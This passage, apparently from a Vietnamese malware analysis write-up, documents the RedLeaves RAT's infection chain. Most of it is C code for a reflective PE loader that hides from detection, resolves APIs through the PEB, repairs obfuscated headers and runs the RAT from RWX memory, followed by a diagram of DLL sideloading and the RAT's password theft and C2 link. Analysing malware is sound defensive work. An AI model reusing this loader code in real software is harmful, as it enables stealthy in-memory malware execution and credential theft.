    // 6. Sao chép từng Section (.text, .rdata, .data, .reloc) vào đúng VirtualAddress
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData > 0) {
            memcpy(
                pImageBase + pSec[i].VirtualAddress,
                pEmbeddedPE + pSec[i].PointerToRawData,
                pSec[i].SizeOfRawData
            );
        }
    }

    // 7. Xử lý Base Relocation nếu ImageBase thực tế khác Preferred ImageBase
    ptrdiff_t delta = (ptrdiff_t)(pImageBase - pNt->OptionalHeader.ImageBase);
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pImageBase + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress > 0) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* pList = (WORD*)(pReloc + 1);
                for (DWORD j = 0; j < count; j++) {
                    if ((pList[j] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* pPatchAddr = (DWORD*)(pImageBase + pReloc->VirtualAddress + (pList[j] & 0x0FFF));
                        *pPatchAddr += (DWORD)delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    // 8. Nạp bảng IAT (Import Address Table) cho các DLL phụ thuộc
    IMAGE_DATA_DIRECTORY importDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pImageBase + importDir.VirtualAddress);
        while (pImport->Name != 0) {
            char* szDllName = (char*)(pImageBase + pImport->Name);
            HMODULE hDll = fnLoadLibraryA(szDllName);

            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pImageBase + pImport->FirstThunk);
            PIMAGE_THUNK_DATA pOrigThunk = (pImport->OriginalFirstThunk) ? 
                (PIMAGE_THUNK_DATA)(pImageBase + pImport->OriginalFirstThunk) : pThunk;

            while (pOrigThunk->u1.AddressOfData != 0) {
                if (IMAGE_SNAP_BY_ORDINAL(pOrigThunk->u1.Ordinal)) {
                    pThunk->u1.Function = (DWORD_PTR)fnGetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pOrigThunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pImageBase + pOrigThunk->u1.AddressOfData);
                    pThunk->u1.Function = (DWORD_PTR)fnGetProcAddress(hDll, (LPCSTR)pImportByName->Name);
                }
                pThunk++;
                pOrigThunk++;
            }
            pImport++;
        }
    }

    // 9. Nhảy vào EntryPoint của RedLeaves RAT (DLL/EXE Entry)
    typedef BOOL(WINAPI *pfnDllMain)(HINSTANCE, DWORD, LPVOID);
    pfnDllMain EntryPoint = (pfnDllMain)(pImageBase + pNt->OptionalHeader.AddressOfEntryPoint);
    
    // Kích hoạt RAT hoàn chỉnh trong RAM
    EntryPoint((HINSTANCE)pImageBase, DLL_PROCESS_ATTACH, NULL);
}
```

Đây là file dll để làm lớp vỏ bọc tránh bị phát hiện
```
#include <windows.h>
#include <winternl.h>

typedef HMODULE (WINAPI *pfnLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC (WINAPI *pfnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef LPVOID  (WINAPI *pfnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

// Tự tìm Base của kernel32.dll qua PEB (Position Independent Code)
HMODULE GetKernel32Base() {
    PPEB pPeb = NULL;
    __asm {
        mov eax, fs:[0x30]
        mov pPeb, eax
    }
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pCurr = pHead->Flink;

    while (pCurr != pHead) {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pCurr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (pEntry->FullDllName.Buffer && (pEntry->FullDllName.Buffer[0] == L'K' || pEntry->FullDllName.Buffer[0] == L'k')) {
            return (HMODULE)pEntry->DllBase;
        }
        pCurr = pCurr->Flink;
    }
    return NULL;
}

// Shellcode Reflective Loader cốt lõi
void ReflectivePELoader(BYTE* pRawPayloadWithShellcode) {
    HMODULE hKernel32 = GetKernel32Base();
    // Tự phân giải API không thông qua IAT
    pfnLoadLibraryA   fnLoadLibraryA   = (pfnLoadLibraryA)CustomGetProcAddress(hKernel32, "LoadLibraryA");
    pfnGetProcAddress fnGetProcAddress = (pfnGetProcAddress)CustomGetProcAddress(hKernel32, "GetProcAddress");
    pfnVirtualAlloc   fnVirtualAlloc   = (pfnVirtualAlloc)CustomGetProcAddress(hKernel32, "VirtualAlloc");

    // 1. Định vị tệp PE nằm ngay sau Shellcode Loader (offset ~ 0x1468)
    BYTE* pEmbeddedPE = pRawPayloadWithShellcode + 0x1468;

    // 2. Khôi phục Header bị tác giả APT10 làm mờ: 0xFF 0xFF -> MZ (0x5A4D)
    if (pEmbeddedPE[0] == 0xFF && pEmbeddedPE[1] == 0xFF) {
        pEmbeddedPE[0] = 'M';
        pEmbeddedPE[1] = 'Z';
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pEmbeddedPE;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pEmbeddedPE + pDos->e_lfanew);
    if (*(WORD*)&pNt->Signature == 0xFFFF) {
        pNt->Signature = IMAGE_NT_SIGNATURE; // Khôi phục 'PE\0\0'
    }

    // 3. Cấp phát vùng nhớ ảo hoàn chỉnh theo SizeOfImage của RAT
    BYTE* pImageBase = (BYTE*)fnVirtualAlloc(
        (LPVOID)pNt->OptionalHeader.ImageBase,
        pNt->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    if (!pImageBase) {
        pImageBase = (BYTE*)fnVirtualAlloc(NULL, pNt->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }

    // 4. Sao chép Headers và từng Section (.text, .rdata, .data, .reloc)
    memcpy(pImageBase, pEmbeddedPE, pNt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData > 0) {
            memcpy(pImageBase + pSec[i].VirtualAddress, pEmbeddedPE + pSec[i].PointerToRawData, pSec[i].SizeOfRawData);
        }
    }

    // 5. Xử lý Base Relocations (nếu nạp khác địa chỉ ImageBase mong muốn)
    ptrdiff_t delta = (ptrdiff_t)(pImageBase - pNt->OptionalHeader.ImageBase);
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pImageBase + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress > 0) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* pList = (WORD*)(pReloc + 1);
                for (DWORD j = 0; j < count; j++) {
                    if ((pList[j] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* pPatchAddr = (DWORD*)(pImageBase + pReloc->VirtualAddress + (pList[j] & 0x0FFF));
                        *pPatchAddr += (DWORD)delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    // 6. Phân giải bảng Import Address Table (IAT)
    IMAGE_DATA_DIRECTORY importDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pImageBase + importDir.VirtualAddress);
        while (pImport->Name != 0) {
            char* szDllName = (char*)(pImageBase + pImport->Name);
            HMODULE hDll = fnLoadLibraryA(szDllName);
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pImageBase + pImport->FirstThunk);
            PIMAGE_THUNK_DATA pOrigThunk = (pImport->OriginalFirstThunk) ? 
                (PIMAGE_THUNK_DATA)(pImageBase + pImport->OriginalFirstThunk) : pThunk;

            while (pOrigThunk->u1.AddressOfData != 0) {
                if (IMAGE_SNAP_BY_ORDINAL(pOrigThunk->u1.Ordinal)) {
                    pThunk->u1.Function = (DWORD_PTR)fnGetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pOrigThunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME pIBN = (PIMAGE_IMPORT_BY_NAME)(pImageBase + pOrigThunk->u1.AddressOfData);
                    pThunk->u1.Function = (DWORD_PTR)fnGetProcAddress(hDll, (LPCSTR)pIBN->Name);
                }
                pThunk++;
                pOrigThunk++;
            }
            pImport++;
        }
    }

    // 7. Nhảy vào EntryPoint kích hoạt toàn bộ tính năng RAT của RedLeaves
    typedef BOOL(WINAPI *pfnDllMain)(HINSTANCE, DWORD, LPVOID);
    pfnDllMain EntryPoint = (pfnDllMain)(pImageBase + pNt->OptionalHeader.AddressOfEntryPoint);
    EntryPoint((HINSTANCE)pImageBase, DLL_PROCESS_ATTACH, NULL);
}
```
Từ 2 chứng cứ trên ta có thể xác định được luồng hoạt động hoàn chỉnh của con malware này
[obedience.exe (Host sạch)]
       │ (Tự nạp theo Search Order)
       ▼
[StarBurn.dll (Proxy Sideload)]
       │ 1. Đọc file "handkerchief.dat"
       │ 2. Giải mã XOR chia đôi mảng bằng 16-byte Key
       │ 3. VirtualAlloc(PAGE_EXECUTE_READWRITE)
       ▼
[handkerchief.dat (Shellcode Stage 2)]
       │ 1. Tìm Kernel32 qua PEB
       │ 2. Sửa header 0xFF 0xFF -> 'MZ' và 'PE'
       │ 3. Map PE Sections + Fix Relocations + Resolve IAT
       ▼
[RedLeaves RAT chạy hoàn toàn trên RAM] (Chụp màn hình, trộm pass Firefox/DPAPI, kết nối C2)

IOC và YARA RULE sẽ được đặt ở cuối
MALware số 2 :



 
